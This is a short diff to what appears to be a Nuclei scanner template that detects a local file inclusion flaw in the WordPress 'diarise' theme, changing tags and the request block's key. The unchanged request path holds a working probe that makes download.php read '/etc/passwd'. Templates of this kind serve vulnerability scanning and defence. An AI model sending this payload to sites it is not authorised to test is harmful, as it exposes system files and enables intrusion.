@@ -11,11 +11,9 @@ info:
     - https://woocommerce.com/?aff=1790
   classification:
     cwe-id: CWE-98
-  tags: packetstorm,wordpress,wp-theme,lfi
-  metadata:
-    max-request: 1
+  tags: wordpress,wp-theme,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd"
